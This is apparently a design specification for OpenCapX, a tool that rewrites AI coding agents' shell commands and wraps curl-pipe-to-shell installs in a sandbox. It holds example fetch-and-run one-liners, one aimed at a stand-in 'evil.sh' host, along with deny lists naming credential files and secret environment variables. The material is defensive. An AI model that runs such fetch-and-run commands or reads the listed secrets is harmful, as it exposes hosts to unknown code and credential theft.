# Command Rules Specification

Command rules **rewrite** the shell commands an agent issues into the form of a user-specified executor — for example
`curl https://x` → `sandbox curl https://x`.

**Positioning: OpenCapX only routes, it does not adjudicate.** It delivers the command to the executor the user chose; the boundary (sandbox,
proxy, container) is the executor's responsibility. OpenCapX does not judge "should this command run" — that is
[permissions.md](permissions.md)'s capability gate, which governs another pipeline (`/rpc` capability calls)
and cannot see the agent's own shell commands.

**Platform note — the bundled `sandbox` executor.** `opencapx sandbox` has a real backend on
macOS (seatbelt) and Linux (bubblewrap); on Windows there is no backend yet (a microVM tier is
planned). Its contract is fail-open: with no backend available it warns, emits a
`sandbox.unguarded` audit event, and runs the command as-is. If your stance is "rather refuse
than run unguarded", pass `--require` (exit code 99 + a `sandbox.blocked` audit instead of the
passthrough) — e.g. `"prepend": "~/.opencapx/bin/opencapx sandbox --require"`, or
`opencapx guard require on` to bake it into the danger-guard's download-and-run rewrites.

## Where It Takes Effect

The agent's **Bash tool call**, via the `PreToolUse` hook:

```text
agent wants to run curl https://x
  → PreToolUse hook (opencapx hook --agent claude)
  → read rules → hit → write updatedInput back to the host (the rewritten command)
  → actually executes sandbox curl https://x
```

The observation channel is still the dumb pipe (raw payload POSTed as-is); the rewrite goes through the **parallel stdout response channel**.
For contract details see [events.md](events.md), "Delivery Contract (CLI → Core)".

## Rule Files

Layered, low → high:

| Layer | Location | Description |
|---|---|---|
| Built-in default | Compiled into the binary | **Currently empty** — no interception is active by default, and upgrades do not change existing workflows |
| Global | `~/.opencapx/rules.json` | The user's home turf |
| Project-level | `<project>/.opencapx/rules.json` | Loaded **only when that project has been explicitly trusted** |

For the same `id`, the more inner layer overrides the more outer one. A layer with bad JSON / invalid rules: **skip that layer and record it, do not block**
(fail-open); `opencapx rules list` will print load errors.

```json
{
  "version": 1,
  "rules": [
    {
      "id": "sandbox-curl",
      "enabled": true,
      "when": { "stage": "tool_pre", "command": { "prefix": "curl " } },
      "unless": { "stage": "tool_pre", "command": { "prefix": "sandbox " } },
      "then": { "action": "rewrite", "prepend": "sandbox" }
    }
  ]
}
```

### Fields

| Field | Required | Description |
|---|---|---|
| `version` | Yes | Rule-file schema version. Currently `1`; unrelated to the app version |
| `rules[].id` | Yes | Rule identifier; audit (`rule.applied`) records by it |
| `rules[].enabled` | No | Defaults to `true` |
| `rules[].when.stage` | Yes | See below |
| `rules[].when.command` | Required for `rewrite` | Command match conditions |
| `rules[].unless` | No | A hit **discards** the rule (used for idempotency, e.g. already inside sandbox) |
| `rules[].then.action` | Yes | See below |

### stage

| stage | Status | Description |
|---|---|---|
| `tool_pre` | **Implemented** | Before the Bash tool call executes |
| `session_start` / `prompt_submit` / `tool_post` / `turn_stop` / `session_end` | Placeholder | Accepted by the parser, no engine action yet (P1+) |

### command Matching

**All** fields that are present must match (AND):

| Field | Semantics |
|---|---|
| `prefix` | The anchored prefix of the main command, e.g. `"curl "` |
| `binary` | The first token of the main command (the executable name), e.g. `"curl"` |
| `regex` | An anchored regex — matched **from position 0** (writing `curl` is safe; it will not match a mid-string `curl`) |

### action and Transform Operators

P0 implements only `rewrite`; `inject` / `observe` / `verify` are P1+ placeholders.

`rewrite` **must** carry exactly one of the following operators (**declarative; shell strings are forbidden**):

| Operator | Effect |
|---|---|
| `prepend` | `curl x` → `sandbox curl x` |
| `replace_binary` | `{"from":"curl","to":"scurl"}` → `scurl x` |
| `env` | `{"HTTPS_PROXY":"..."}` → `HTTPS_PROXY=... curl x` |

Any undeclared field (e.g. `shell`) is rejected at **parse time** — this is a hard constraint, not a convention.

## Composition Semantics (P0)

- **First hit wins**: rules are scanned in load order and the first one that produces a rewrite takes effect.
- **Idempotent**: already inside the wrapper (`sandbox curl x`) is left alone; an existing `env` prefix is not stacked again.
- **Leading wrappers**: `sudo` / `env` / `time` / `nohup` / `nice` / `command` and `KEY=VALUE`
  assignments are stripped first and then transformed, with the transform landing after the leading part — `sudo curl x` → `sudo sandbox curl x`
  (never `sandbox sudo curl x`).
- **Only a single simple command is handled**: input containing `&&` / `||` / `|` / `;` / newlines / command substitution is **never rewritten**.
  Better to miss a match than to make a wrong one.

## Danger Guard (built-in, whole-line rewrite)

The rule engine refuses compound input (`|`, `&&`, `;`, …) on purpose — it only rewrites a
single simple command. That leaves the classic download-and-execute idiom (`curl … | sh`)
untouched, and that idiom is exactly what runs an unknown script with full host privileges.
The **danger guard** covers it with a whole-line rewrite that splits download from execution:

| Input | Rewritten (runs instead) |
|---|---|
| `curl -fsSL https://x.sh \| sh` | `__ocx_dl="$(mktemp …)"; curl -fsSL https://x.sh -o "$__ocx_dl" && "<shim>" sandbox --profile installer --env strip -- sh "$__ocx_dl"` + cleanup + real exit code |
| `wget -q https://x.sh \| bash -e` | same shape: `mktemp` + `wget … -O "$__ocx_dl"` + `sandbox … -- bash -e "$__ocx_dl"` |
| `bash <(curl -fsSL https://x.sh)` | download + `sandbox … -- bash "$__ocx_dl"` |
| `bash -c "$(curl …)"` / `eval "$(curl …)"` | download + `sandbox … -- sh "$__ocx_dl"` |

The download target is a `mktemp` path held in `__ocx_dl` (a predictable fixed path in a
sticky `/tmp` plus curl's symlink-following would hand a local attacker a write-anywhere
race the original `curl | sh` never had); the tail is `rm -f "$__ocx_dl"; (exit $rc)` so the
file is cleaned up and the real exit code propagates without exiting the host shell.

- **Normalization first**: `env` (with its own flags `-i`/`-u NAME`/`--ignore-environment`/
  `--unset`), `KEY=VALUE` assignments, `nohup` / `nice` / `time` / `command`, backslash
  quotes (`\curl`) and path-prefixed downloaders (`/usr/bin/curl`, `./wget`) are normalized
  before matching — `env -i curl … | sh` and `\curl … | sh` no longer slip the guard — and
  the rewrite re-attaches the lead exactly as written. `sudo` / `doas` stay out of scope;
  `xargs curl … | sh` deliberately too (it changes the downloader's argument semantics).
- **The download stays on the host** (it needs the network); the **execution** goes through
  `opencapx sandbox --profile installer` — installer-compatible by design: the network is open
  and `$HOME` is writable (installers install), while a curated deny list keeps **secret
  material unreadable** (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.npmrc`, `~/.docker/config.json`,
  `~/.config/gh`, `~/.kube`, `~/.git-credentials`, `~/.config/gcloud`, `~/.azure`, browser
  profiles, Keychains, shell history, …) and **persistence hot spots unwritable** (shell
  rc files, `~/.gitconfig`, `~/Library/LaunchAgents`, cron/at, …). An installer that edits rc
  files only loses the automatic PATH hint (it can print the line); malware that wants to
  survive a reboot or steal keys loses its footing.
- **Strict mode**: `OPEN_CAPX_DANGER_GUARD=strict` (or `opencapx guard mode strict`) switches
  the rewrite to `--profile strict` (network denied, writes fenced to a scratch dir) — for
  "run this unknown thing" scenarios.
- **Trusted installer domains**: installers that need what the sandbox will never grant (sudo,
  writes outside `$HOME` — Homebrew et al) can be trusted explicitly:
  `opencapx guard trust get.docker.com` → downloads from that host pass through untouched,
  audited as `danger/trusted-passthrough`. `opencapx guard list` / `opencapx guard untrust
  <domain>` manage the table (`~/.opencapx/guard.json`, mode 0600). Trust requires **every
  URL in the line** to be on the list — a decoy trusted URL in another argument or a second
  untrusted fetch target does not vouch (`curl -A "https://trusted.rs" https://evil.sh/x | sh`
  is still guarded). `-L` redirect chains are text-invisible and remain uncovered.
- **Order**: user rules win; the guard runs only when no rule produced a rewrite. Its hits are
  audited with rule ids `danger/download-pipe-shell`, `danger/download-process-substitution`,
  `danger/download-command-substitution`, `danger/download-eval`.
- **Audit-only hits** (command runs unchanged, shape recorded in the Activity Timeline, and
  **no auto-allow written back** — the host's own permission flow decides):
  `danger/unsupported-shape` — the idiom matched but cannot be rewritten with confidence
  (stdin/interactive shell flags `sh -s` / bare `-` / `-i`, any positional shell operand such
  as `/dev/stdin`, downloader output flags like `-o`/`-O`/`--output`/`--remote-name` /
  `wget -qO-`, a lead on the substitution forms, nested substitutions);
  `danger/embedded-download-execute` — the idiom sits inside a compound line
  (`cd /tmp && curl … | sh`, pipelines beyond one pipe); downloader variants
  (`wget2`/`axel`/`xh`/`aria2c`) are at least visible this way. Disabling the guard (env or
  file) does not silence it: matched idioms are then audited as `danger/guard-disabled`.
- **Stricter on failure**: a failed download no longer executes anything (the original `| sh`
  runs the shell on whatever came through the pipe, including an error page).
- **Stance**: `opencapx guard mode <installer|strict|off>` persists the default stance in
  `~/.opencapx/guard.json`; `OPEN_CAPX_DANGER_GUARD=<installer|strict|off>` overrides it
  per-invocation (env wins, both case-insensitive). `opencapx guard env <strip|keep|clear>`
  picks the `--env` policy baked into the rewrite (`strip` default; `keep` for installers
  that consume registry/CI tokens from the environment).
- **Boundary**: like every rewrite here, a pass is granted (`permissionDecision: allow`) —
  except the audit-only shapes above, which write nothing back. The guard is a fence against
  accidental damage and common malware behavior, not a proof-grade boundary against a
  directed attacker.

## Sandbox Executor (`opencapx sandbox`)

The guard (and any user rule) can route commands through the platform guard:

```text
opencapx sandbox [--profile strict|installer] [--allow-net] [--rw <dir>]... [--env keep|strip|clear] [--timeout <secs>] [--check] [--print-profile] -- <command...>
```

- **Profiles**: `strict` (default for manual use) = network denied, writes limited to a per-run
  scratch dir + the child's `TMPDIR`; `--rw DIR` opens more, `--allow-net` lifts the network
  fence. `installer` (the danger guard's default) = network open + `$HOME` writable, minus the
  secrets/persistence deny list described above. Seatbelt applies later rules last, so the deny
  list overrides the broad allows — the ordering is the enforcement.
- **Environment**: seatbelt and bwrap cannot express "don't hand over the environment", but the
  runner spawns the child itself, so it filters there. `--env strip` (default) drops
  secret-looking variables (`*_TOKEN*`, `*SECRET*`, `*PASSWORD*`, `*CREDENTIAL*`, `*_API_KEY`,
  `SSH_AUTH_SOCK`, `GIT_ASKPASS`, …) — with installer mode's open network that closes the
  cheapest exfiltration path. `--env clear` keeps only `PATH/HOME/TMPDIR/USER/SHELL/LANG/TERM`;
  `--env keep` passes everything through.
- **macOS**: seatbelt (`sandbox-exec`, deprecated by Apple but functional; the profile shares
  the calibrated plugin-sandbox header — `process*` + `mach-lookup` + global reads, boundary =
  write + network). **Linux**: bubblewrap (`bwrap`; a namespace probe fails over with a reason
  when AppArmor/sysctl restrictions block unprivileged user namespaces). Installer mode is
  honored on both: on Linux the deny list is expressed as shadowing mounts — tmpfs over
  directory targets (host content unreadable, writes vanish with the sandbox) and a read-only
  `/dev/null` bind over file targets (reads empty, writes denied; a tmpfs is a directory and
  mounting one over a file would error the whole bwrap run into the unguarded fallback). Only
  paths that exist are shadowed, so **creating** a previously absent `~/.zshrc` stays possible
  on Linux (seatbelt denies creation too; known divergence). **Other platforms** (incl.
  Windows, W1): warn once and run unguarded — a microVM tier via microsandbox (requires WHP)
  is the planned strong option.
- **Fail-open by design**: a missing or broken backend never blocks the command (warn + run
  as-is); exit code, stdout and stderr pass through untouched. When that happens the run is
  audited as `rule.applied` with rule id `sandbox.unguarded` (payload carries the reason), so
  the Activity Timeline shows the fence was absent — a stderr warning alone gets lost in agent
  transcripts.
- `--check` prints backend availability (exit 0 = available); `--print-profile` prints the
  generated seatbelt profile for review (the deny list lives there).

## Coverage Matrix (P0)

| agent | Rewrite | Description |
|---|---|---|
| Claude Code | ✅ | `PreToolUse` + `updatedInput` write-back |
| Codex | ✅ | Same as above |
| Gemini | ✅ | `BeforeTool` + `hookSpecificOutput.tool_input` write-back (field names differ per host; see `pre_tool_response`) |
| Factory Droid | ✅ | Claude shape: `PreToolUse` + `hookSpecificOutput.updatedInput` |
| Cursor | ✅ | Top-level envelope on `preToolUse` — `permission` + `updated_input`; a no-decision call answers `{}` |
| GitHub Copilot CLI | ✅ | PascalCase `PreToolUse` + `hookSpecificOutput.updatedInput`; rewritten commands still pass Copilot's own confirmation dialog (upstream github/copilot-cli#2643) |
| opencode | ⚠️ audit-only | The host ignores stdout write-back; OpenCapX's own opencode plugin performs the rewrite via `opencapx rewrite`, the hook records the audit id |
| Oh My Pi (omp) | ✅ | The OMP extension `connect` installs asks the hook on each `tool_call` and applies the reply as `{ input }` — OMP revalidates the args and its approval prompt shows what actually runs |
| Others (windsurf / antigravity / kiro / pi / grok) | Pass-through as-is | Each vendor's write-back protocol is a separate project |

## Audit

A hit rewrite emits `rule.applied` (`ruleId`, `agent`, `command`) and goes into the Activity Timeline;
the CLI injects `__rule`, and Core extracts and publishes it during `ingest`. See [events.md](events.md).

## CLI

```text
opencapx rewrite <command...>       # print the rewrite result; hit exit 0, miss exit 1 (not executed)
opencapx sandbox [opts] -- <cmd...> # run behind the OS guard (see "Sandbox Executor" above)
opencapx guard mode <installer|strict|off> # persist the danger-guard stance (~/.opencapx/guard.json)
opencapx guard env <strip|keep|clear>     # env policy the rewrite passes to the sandbox
opencapx rules list                 # currently effective rules (including source and load errors)
opencapx rules explain <command...> # dry-run: print the hit chain and result, do not execute
opencapx rules trust [path]         # trust a project (defaults to the current directory)
opencapx rules untrust [path]       # revoke trust
```

Settings page → the **Command Rules** tab offers the same capabilities: add rules, toggle **global** rules, manage trusted projects.
Project-level rules are read-only (their substance lives in a file inside the repository); changing them means editing that file.

## Trust and Security Boundaries (Honest Statement)

- **A rewrite is a pass.** When writing `updatedInput` back, the hook attaches `permissionDecision: "allow"`.
  This means the hook **holds authority** from then on — which is exactly why project-level rules **do not take effect by default**.
- **Project-level rules = an injection surface.** Simply `clone`ing a repository grants rule-injection power, and the transforms are
  **invisible and arbitrary** (`curl` can be sent to any executor). Hence the explicit
  `opencapx rules trust` requirement; untrusted project-level rules are always ignored.
- **A rewrite changes what the host's permission rules match against.** If the host configured `Bash(curl:*)`, it matches
  the **rewritten** `sandbox curl ...`. When configuring host permissions, take the wrapped form into account as well.
- **On this pipeline OpenCapX holds no adjudication authority**; it only routes, and the boundary is the executor's responsibility.
- **fail-open.** A missing/corrupt rule file, insufficient match confidence, or any internal error → the command is **executed as-is**,
  and the agent is never blocked.

## Version and Compatibility

`version` is the rule file's schema version and is **unrelated to the app version**. Evolution is additive only: adding optional fields and
adding stages / operators are both legal; deleting, renaming, tightening requirements, and changing existing field semantics are breaking changes
that require bumping `version` and providing a migration window. Currently `version: 1`.
